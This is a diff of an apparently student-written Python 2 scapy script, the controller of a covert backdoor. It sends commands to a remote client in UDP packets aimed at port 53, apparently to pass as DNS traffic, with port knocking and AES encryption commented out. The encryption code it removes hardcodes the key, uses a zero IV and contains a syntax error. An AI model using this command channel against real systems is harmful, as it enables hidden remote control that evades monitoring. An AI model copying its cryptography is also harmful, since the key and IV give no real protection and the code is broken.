@@ -14,7 +14,7 @@ def sendCommand(command):
     #If it's the first command, send the port knocks
     global counter
     print "The counter is at %d"%(counter)
-    
+
     #If this is the first message being sent, do a port knock.
     # UNCOMMENT THIS LATER.
     # if(counter == 0):
@@ -24,7 +24,7 @@ def sendCommand(command):
     #     #wait for response from client
     #     sniff(filter='ip', stop_filter=stopfilter)
     #     print "Got here!"
-    #Not the first time sending OR 
+    #Not the first time sending OR
     #Response from client received, TIME TO SEND!
     print "TIME TO SEND!"
     send(craftCommandPacket(command));
@@ -66,23 +66,27 @@ def craftCommandPacket(command):
     print "dstIP is %s"%dstIP
     print "dstPort is %s"%dstPort
     print "comand is %s"%command
-    data = encryptMessage(command)
-    packet = IP(dst=dstIP) / UDP(dport=int(dstPort)) / Raw(load=data)
+    #TODO:
+    # data = encryptMessage(command)
+
+    print "Sending command packet"
+    packet = (IP(dst=dstIP)/UDP(sport=int(dstPort),dport=53)/command)
     return packet
 
-def encryptMessage(command):
-    print "Encrypting command: %s"%command
-    key = '0123456789abcdef'
-    IV = 16 * '\x00'           # Initialization vector: discussed later
-    mode = AES.MODE_CBC
-    encryptor = AES.new(key, mode, IV=IV)
-
-    if(len(command) <> 16)
-        text = padCommand(command)
-    print text
-    ciphertext = encryptor.encrypt(text)
-    print "encryptedCommand is: %s"%ciphertext
-    return ciphertext
+#Not finished yet
+# def encryptMessage(command):
+#     print "Encrypting command: %s"%command
+#     key = '0123456789abcdef'
+#     IV = 16 * '\x00'           # Initialization vector: discussed later
+#     mode = AES.MODE_CBC
+#     encryptor = AES.new(key, mode, IV=IV)
+#
+#     if(len(command) <> 16)
+#         text = padCommand(command)
+#     print text
+#     ciphertext = encryptor.encrypt(text)
+#     print "encryptedCommand is: %s"%ciphertext
+#     return ciphertext
 
 
 def padCommand(command):
